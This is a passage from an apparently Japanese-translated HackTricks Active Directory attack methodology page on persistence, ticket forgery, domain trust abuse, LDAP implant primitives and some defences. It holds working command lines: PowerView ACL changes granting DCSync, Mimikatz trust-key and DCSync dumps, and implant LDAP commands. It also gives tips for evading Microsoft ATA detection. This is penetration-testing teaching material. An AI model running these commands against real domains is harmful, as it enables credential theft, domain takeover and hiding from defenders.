**LAPS** は、domain-joined computers の **local Administrator password** を管理する system を提供し、password が **randomized** され、unique で、頻繁に **changed** されることを保証します。これらの passwords は Active Directory に保存され、access は authorized users のみに ACLs で制御されます。これらの passwords に access する十分な permissions がある場合、他の computers への pivoting が可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

compromised machine から **certificates を gather** することは、environment 内で privileges を escalate する方法になり得ます:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**vulnerable templates** が設定されている場合、それらを abuse して privileges を escalate できます:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

**Domain Admin**、またはさらに好ましい **Enterprise Admin** privileges を取得すると、**domain database**: _ntds.dit_ を **dump** できます。

[**DCSync attack の詳細はこちら**](dcsync.md)。

[**NTDS.dit を steal する方法の詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前述した technique の一部は persistence に使用できます。\
例えば、以下を実行できます:

- users を [**Kerberoast**](kerberoast.md) に対して vulnerable にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- users を [**ASREPRoast**](asreproast.md) に対して vulnerable にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- user に [**DCSync**](#dcsync) privileges を grant する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、**NTLM hash**（例えば **PC account の hash**）を使用して、特定の service 用の **legitimate Ticket Granting Service (TGS) ticket** を作成します。この method は、**service privileges に access** するために使用されます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** では、Active Directory (AD) environment 内の **krbtgt account の NTLM hash** を attacker が取得します。この account は、AD network 内での authentication に不可欠な、すべての **Ticket Granting Tickets (TGTs)** の署名に使用されるため特殊です。

この hash を取得すると、attacker は任意の account 用の **TGTs** を作成できます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは、**一般的な golden tickets の detection mechanisms を bypass** する方法で forge された golden tickets に似ています。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**account の certificates を持っている、またはそれらを request できること**は、user が password を変更した場合でも、その account に persistence する非常に有効な方法です:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificates を使用して、domain 内で high privileges のまま persistence することも可能です:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** object は、これらの groups 全体に標準の **Access Control List (ACL)** を適用することで、Domain Admins や Enterprise Admins などの **privileged groups** の security を確保し、unauthorized changes を防止します。しかし、この feature は exploit 可能です。attacker が AdminSDHolder の ACL を変更して regular user に full access を与えると、その user はすべての privileged groups を広範に control できるようになります。保護を目的としたこの security measure は、厳密に monitor されなければ、逆に unwarranted access を許してしまう可能性があります。

[**AdminDSHolder Group の詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** 内には、**local administrator** account が存在します。このような machine 上で admin rights を取得すると、**mimikatz** を使用して local Administrator hash を extract できます。その後、registry modification を行って **この password の使用を enable** する必要があります。これにより、local Administrator account への remote access が可能になります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

特定の domain objects に対して、user が **将来 privileges を escalate** できるように、user に **special permissions** を **give** できます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** は、ある **object** が別の **object** に対して持つ **permissions** を **store** するために使用されます。object の **security descriptor** に **little change** を加えるだけで、privileged group の member になる必要なく、その object に対する非常に興味深い privileges を取得できます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class を abuse して、`entryTTL`/`msDS-Entry-Time-To-Die` により短命な principals/GPOs/DNS records を作成します。これらは tombstones を残さず self-delete し、LDAP evidence を消去する一方で、orphan SIDs、壊れた `gPLink` references、または cached DNS responses（例: AdminSDHolder ACE pollution や malicious `gPCFileSysPath`/AD-integrated DNS redirects）を残します。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

memory 内の **LSASS** を alter して **universal password** を確立し、すべての domain accounts への access を与えます。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider) とは何かはこちら。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成して、machine への access に使用される **credentials** を **clear text** で **capture** できます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD に **new Domain Controller** を register し、それを使用して指定した objects に **attributes**（SIDHistory、SPNs...）を **push** します。この際、**modifications** に関する **logs** を残しません。**DA** privileges が必要で、**root domain** 内にいる必要があります。\
誤った data を使用すると、非常に見苦しい logs が出現することに注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

これまで、**LAPS passwords を read する十分な permission** がある場合に privileges を escalate する方法について説明しました。しかし、これらの passwords は **persistence を maintain** するためにも使用できます。\
以下を確認してください:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft は **Forest** を security boundary と見なしています。これは、**single domain を compromise すると、entire Forest が compromise される可能性がある**ことを意味します。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある **domain** の user が別の **domain** の resources に access できるようにする security mechanism です。これは基本的に、2 つの domains の authentication systems 間に linkage を作成し、authentication verifications が seamless に flow できるようにします。domains が trust を設定すると、trust の integrity に不可欠な特定の **keys** を交換し、**Domain Controllers (DCs)** 内に保持します。

一般的な scenario では、user が **trusted domain** 内の service に access しようとする場合、まず自分の domain の DC に **inter-realm TGT** と呼ばれる special ticket を request する必要があります。この TGT は、両 domains が合意した共有 **key** で encrypted されます。次に user は、この TGT を **trusted domain の DC** に提示して、service ticket（**TGS**）を取得します。trusted domain の DC が inter-realm TGT の validation に成功すると、TGS を発行し、user に service への access を許可します。

**Steps**:

1. **Domain 1** 内の **client computer** が、**NTLM hash** を使用して **Domain Controller (DC1)** に **Ticket Granting Ticket (TGT)** を request することで process を開始します。
2. client の authentication が成功すると、DC1 は new TGT を issue します。
3. 次に client は DC1 に **inter-realm TGT** を request します。これは **Domain 2** 内の resources に access するために必要です。
4. inter-realm TGT は、two-way domain trust の一部として DC1 と DC2 が共有する **trust key** で encrypted されます。
5. client は inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に渡します。
6. DC2 は共有 trust key を使用して inter-realm TGT を verify し、有効な場合、client が access したい Domain 2 内の server 用に **Ticket Granting Service (TGS)** を issue します。
7. 最後に client は、この TGS を server に提示します。TGS は server の account hash で encrypted されており、Domain 2 の service への access を取得します。

### Different trusts

**trust は 1 way または 2 ways にできる**ことに注意することが重要です。2 ways の場合、両 domains は相互に trust しますが、**1 way** の trust relation では、一方の domain が **trusted** domain、もう一方が **trusting** domain になります。この場合、**trusted domain から trusting domain 内の resources にのみ access できます**。

Domain A が Domain B を trust する場合、A は trusting domain で、B は trusted domain です。さらに、**Domain A** ではこれが **Outbound trust** となり、**Domain B** では **Inbound trust** となります。

**Different trusting relationships**

- **Parent-Child Trusts**: 同じ forest 内で一般的な構成です。child domain は parent domain と自動的に two-way transitive trust を持ちます。基本的に、authentication requests が parent と child の間を seamless に flow できることを意味します。
- **Cross-link Trusts**: "shortcut trusts" と呼ばれ、referral processes を高速化するため child domains 間に確立されます。複雑な forests では、authentication referrals は通常 forest root まで上がってから target domain まで下る必要があります。cross-links を作成すると経路が短縮され、地理的に分散した environments で特に有効です。
- **External Trusts**: 異なる、無関係な domains 間に設定され、本質的に non-transitive です。[Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) によると、external trusts は forest trust で接続されていない current forest 外の domain 内の resources に access する場合に有用です。external trusts では SID filtering により security が強化されます。
- **Tree-root Trusts**: forest root domain と新しく追加された tree root の間に自動的に確立されます。一般的ではありませんが、tree-root trusts は新しい domain trees を forest に追加するために重要です。これにより、固有の domain name を維持し、two-way transitivity を確保できます。詳細は [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) を参照してください。
- **Forest Trusts**: 2 つの forest root domains 間の two-way transitive trust であり、security measures を強化するため SID filtering も適用します。
- **MIT Trusts**: Windows 以外の、[RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains と確立されます。MIT trusts はより specialized で、Windows ecosystem 外の Kerberos-based systems との integration が必要な environments に対応します。

#### Other differences in **trusting relationships**

- trust relationship は **transitive**（A が B を trust し、B が C を trust する場合、A は C を trust する）または **non-transitive** にできます。
- trust relationship は **bidirectional trust**（相互に trust）または **one-way trust**（一方のみが他方を trust）として設定できます。

### Attack Path

1. trusting relationships を **Enumerate** する
2. **security principal**（user/group/computer）が **other domain** の resources に **access** できるか確認する。ACE entries によるものや、other domain の groups に所属している場合があります。**domains 間の relationships** を探します（おそらくこれが trust を作成した理由です）。
1. この場合、kerberoast も別の option になる可能性があります。
3. domains 間を **pivot** できる **accounts** を **Compromise** する。

Attackers が another domain の resources に access する主な mechanisms は 3 つあります:

- **Local Group Membership**: principals は、server の “Administrators” group など、machines 上の local groups に追加されることがあり、その machine に対する大きな control が与えられます。
- **Foreign Domain Group Membership**: principals は foreign domain 内の groups の member になることもできます。ただし、この method の有効性は trust の性質と group の scope に依存します。
- **Access Control Lists (ACLs)**: principals は **ACL**、特に **DACL** 内の **ACEs** の entities として指定され、specific resources への access が与えられる場合があります。ACLs、DACLs、ACEs の mechanics を詳しく知りたい場合、whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” は非常に価値のある resource です。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認して、domain 内の foreign security principals を見つけることができます。これらは **external domain/forest** の user/group です。

これを **Bloodhound** または powerview を使用して確認できます:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent フォレスト権限昇格
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン信頼関係を列挙するその他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **信頼されたキーは2つ**あり、1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されているキーは、以下で確認できます：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection を悪用して、Enterprise admin として child/parent domain に権限昇格します：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) をどのように悪用できるかを理解することは重要です。Configuration NC は、Active Directory (AD) 環境において、forest 全体の構成データを格納する中央リポジトリとして機能します。このデータは forest 内のすべての Domain Controller (DC) に複製され、書き込み可能な DC は Configuration NC の書き込み可能なコピーを保持します。これを悪用するには、**DC 上で SYSTEM 権限**を持っている必要があり、child DC が望ましいです。

**Link GPO to root DC site**

Configuration NC の Sites コンテナーには、AD forest 内のすべての domain-joined computer の site に関する情報が含まれています。任意の DC で SYSTEM 権限を用いることで、攻撃者は GPO を root DC site にリンクできます。この操作により、これらの site に適用されるポリシーを操作して、root domain を侵害できる可能性があります。

詳細については、[Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) の研究を参照してください。<sup>[[12]](#references)</sup>

**forest 内の任意の gMSA を侵害する**

攻撃ベクトルの1つは、domain 内の privileged gMSA を標的にすることです。gMSA のパスワード計算に不可欠な KDS Root key は、Configuration NC 内に格納されています。任意の DC で SYSTEM 権限を持つ場合、KDS Root key にアクセスし、forest 全体の任意の gMSA のパスワードを計算できます。

詳細な分析と手順については、以下を参照してください：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補足的な delegated MSA attack (BadSuccessor – migration attributes の悪用)：


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の外部研究：[Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema change attack**

この手法では、新しい privileged AD object が作成されるまで待機する忍耐が必要です。SYSTEM 権限があれば、攻撃者は AD Schema を変更して、任意の user にすべての class に対する完全な control を付与できます。これにより、新しく作成された AD object への不正なアクセスと control が可能になるおそれがあります。

詳細については、[Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) を参照してください。<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability は、Public Key Infrastructure (PKI) object に対する control を悪用し、forest 内の任意の user として authentication を可能にする certificate template を作成します。PKI object は Configuration NC 内に存在するため、書き込み可能な child DC を侵害すると ESC5 attack を実行できます。

詳細は [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) で確認できます。<sup>[[15]](#references)</sup> ADCS が存在しない場合でも、攻撃者は必要なコンポーネントをセットアップできます。詳細は [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) で説明されています。<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインが外部ドメインから信頼されており**、その外部ドメインに対して**不特定の権限**を持っています。あなたのドメインの**どの principal が外部ドメインに対してどのアクセス権を持っているか**を特定し、それを悪用できるか試す必要があります。


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレスト ドメイン - 一方向（Outbound）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは、**あなたのドメイン**が**異なるドメイン**の principal に対して、いくつかの**権限**を**信頼**しています。

しかし、ある**ドメインが信頼される**と、信頼するドメインによって、**予測可能な名前**を持ち、**パスワードとして信頼されたパスワード**を使用するユーザーが作成されます。つまり、**信頼するドメインのユーザーにアクセスして、信頼されたドメイン内部に侵入し**、そのドメインを列挙して、さらに多くの権限への昇格を試みることが可能です:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

信頼されたドメインを侵害する別の方法は、ドメイン trust の**反対方向**に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

信頼されたドメインを侵害する別の方法は、**信頼されたドメインのユーザーがアクセスできる**マシンで待機し、そのユーザーが **RDP** 経由でログインするのを待つことです。その後、攻撃者は RDP session process に code を inject し、そこから**被害者の origin domain にアクセス**できます。\
さらに、**被害者がハードドライブをマウントしていた**場合、攻撃者は **RDP session** process から、**ハードドライブの startup folder に backdoor** を保存できます。この technique は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trust 全体で SID history attribute を悪用する攻撃のリスクは、SID Filtering によって軽減されます。SID Filtering は、すべての inter-forest trust でデフォルトで有効化されています。これは、Microsoft の見解に従い、domain ではなく forest を security boundary とみなし、intra-forest trust は安全であるという前提に基づいています。
- ただし、注意点があります。SID filtering は application や user access を妨げる可能性があるため、無効化されることがあります。

### **Selective Authentication:**

- inter-forest trust では、Selective Authentication を使用することで、2 つの forest のユーザーが自動的に認証されないようにできます。代わりに、trusting domain または forest 内の domain や server にユーザーがアクセスするには、明示的な権限が必要です。
- 重要なのは、これらの対策では writable Configuration Naming Context (NC) の悪用や trust account への攻撃を防げない点です。

[**ired.team の domain trust に関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は、bloodyAD-style LDAP primitives を x64 Beacon Object Files として再実装したもので、on-host implant（例: Adaptix C2）内だけで完全に実行されます。Operator は `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` で pack を compile し、`ldap.axs` を load してから、beacon で `ldap <subcommand>` を実行します。すべての traffic は、LDAP (389) では現在の logon security context を signing/sealing 付きで、または LDAPS (636) では auto certificate trust 付きで使用するため、socks proxy や disk artifact は必要ありません。<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`、`get-computers`、`get-groups`、`get-usergroups`、`get-groupmembers` は short name/OU path を full DN に解決し、対応する object を dump します。
- `get-object`、`get-attribute`、`get-domaininfo` は任意の attribute（security descriptor を含む）と、`rootDSE` から forest/domain metadata を取得します。
- `get-uac`、`get-spn`、`get-delegation`、`get-rbcd` は、roasting candidate、delegation settings、既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptor を LDAP から直接表示します。
- `get-acl` と `get-writable --detailed` は DACL を解析し、trustee、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）、inheritance を一覧表示することで、ACL privilege escalation の即時 target を示します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### escalation と persistence のための LDAP write primitives

- Object creation BOFs (`add-user`、`add-computer`、`add-group`、`add-ou`) により、OU の権限が存在する場所に新しい principal または machine account を準備できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property 権限が見つかったターゲットを直接 hijack します。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync` などの ACL に重点を置いた command は、任意の AD object に対する WriteDACL/WriteOwner を、password reset、group membership の制御、または DCSync replication privilege に変換します。PowerShell/ADSI artifact を残す必要はありません。`remove-*` counterpart により、注入した ACE を cleanup できます。

### Delegation、roasting、Kerberos abuse

- `add-spn`/`set-spn` により、侵害した user を即座に Kerberoastable にできます。`add-asreproastable`（UAC toggle）は password に触れずに、その user を AS-REP roasting の対象にします。
- Delegation macro（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beacon から `msDS-AllowedToDelegateTo`、UAC flag、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換えます。これにより constrained/unconstrained/RBCD attack path が有効になり、remote PowerShell や RSAT が不要になります。

### sidHistory injection、OU relocation、attack surface shaping

- `add-sidhistory` は、管理下の principal の SID history に privileged SID を注入します（[SID-History Injection](sid-history-injection.md) を参照）。これにより、LDAP/LDAPS のみで stealthy な access inheritance を実現できます。
- `move-object` は computer または user の DN/OU を変更します。これにより attacker は、`set-password`、`add-groupmember`、または `add-spn` を abuse する前に、delegated rights がすでに存在する OU へ asset を移動できます。
- 範囲を厳密に限定した removal command（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` など）により、operator が credential または persistence を harvest した後に迅速な rollback が可能になり、telemetry を最小限に抑えられます。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**credential の保護方法について詳しく学ぶ。**](../stealing-credentials/credentials-protections.md)

### **credential 保護のための Defensive Measures**

- **Domain Admins の制限**: Domain Admins は Domain Controller への login のみに許可し、他の host で使用しないことが推奨されます。
- **Service Account の privilege**: security を維持するため、service は Domain Admin（DA）privilege で実行しないでください。
- **Temporal Privilege Limitation**: DA privilege が必要な task では、その duration を制限してください。これは次のように実現できます: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075 を audit し、その後 DC/client で LDAP signing と LDAPS channel binding を enforce して LDAP MITM/relay attempt を block します。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity の protocol-level fingerprinting

一般的な AD tradecraft を detect したい場合、名前を変更した binary、service name、temp batch file、output path など、**operator が制御できる artifact のみに依存しないでください**。正規の Windows client が [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMI traffic を構築する方法を baseline 化し、operator が `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py`、`ntlmrelayx.py` を編集した後にも残る **implementation quirk** を探します。<sup>[[8]](#references)</sup>

- **High-confidence standalone candidate**（独自の baseline に対して validation した後）:
- `auth_context_id = 79231 + ctx_id` を使用する authenticated DCE/RPC
- `0xff` で埋められた DCE/RPC authentication padding
- raw Kerberos `AP-REQ` を SPNEGO の `mechToken` に直接配置する LDAP Kerberos bind
- ASCII のように見える `ClientGuid` を含む SMB2/3 negotiate request
- 標準外の namespace `//./root/cimv2` を使用する WMI `IWbemLevel1Login::NTLMLogin`
- hardcoded Kerberos nonce value
- **Correlation/scoring feature として使用する方がよいもの**:
- sparse または duplicated な Kerberos etype list、通常と異なる/欠落した `PA-DATA`、または native Windows と異なる TGS-REQ etype ordering
- version info がない NTLM Type 1 message、または null host name を持つ Type 3 message
- SPNEGO の代わりに DCE/RPC で運ばれる raw NTLMSSP、欠落した DCE/RPC verification trailer、または SPNEGO/Kerberos OID mismatch
- 同じ host/user/session/time window からこれらの trait が複数確認される場合、単一の弱い field よりもはるかに強い signal になります
- **standalone alert ではなく enrichment として使用するもの**:
- default filename、output path、random service name、temporary batch name、default computer account name、tool-specific HTTP/WebDAV/RDP/MSSQL string
- これらは operator が簡単に変更できるため、cross-protocol cluster が suspicious である理由を説明する用途に適しています
- **Operational notes**:
- これらの signal の一部には、復号済み traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、または service-side visibility が必要です
- alert に昇格させる前に、Samba/Linux client、appliance、legacy software に対して validation してください
- baseline に対する confidence を高めながら、detection を enrichment -> hunting -> alerting の順に昇格させます

### **Deception Technique の実装**

- Deception の実装では、password が expire しない、または Trusted for Delegation として mark されている decoy user や computer などの trap を設定します。詳細な approach には、specific rights を持つ user の作成や、high privilege group への追加が含まれます。<sup>[[2]](#references)</sup>
- 実用的な例として、次のような tool を使用します: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception technique の deploy については、[GitHub の Deploy-Deception](https://github.com/samratashok/Deploy-Deception) を参照してください。

### **Deception の識別**

- **User Object**: suspicious な indicator には、atypical な ObjectSID、infrequent な logon、creation date、少ない bad password count などがあります。
- **General Indicator**: potential decoy object の attribute を genuine object のものと比較することで、inconsistency を明らかにできます。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) などの tool は、このような deception の識別に役立ちます。

### **Detection System の bypass**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection を防ぐため、Domain Controller 上での session enumeration を避けます。
- **Ticket Impersonation**: ticket 作成に **aes** key を利用すると、NTLM への downgrade が発生しないため detection を回避できます。
- **DCSync Attack**: ATA detection を避けるため、Domain Controller 以外から実行することが推奨されます。Domain Controller から直接実行すると alert が発生します。

## References

- [1] [Domain Trust を攻撃するためのガイド](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory における Deception のための Trust の Forging](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin から Enterprise Admin へ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation のための In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash を Wordlist として Weaponize する](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket の Dissecting](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Netlogon 経由で Active Directory Account を Take Over する Onelogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 に関連する Netlogon secure channel connection の変更を管理する方法](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [忘れられた Null Session と MS-RPC interface への旅](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domain 間の security boundary としての SID filter? (Part 4) - SID filtering research の Bypass](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domain 間の security boundary としての SID filter? (Part 5) - Golden GMSA trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domain 間の security boundary としての SID filter? (Part 6) - Schema change trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 による DA から EA への escalation](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS を abuse して child domain の admin から enterprise admin へ 5 分で escalation する follow-up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoor の設計](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
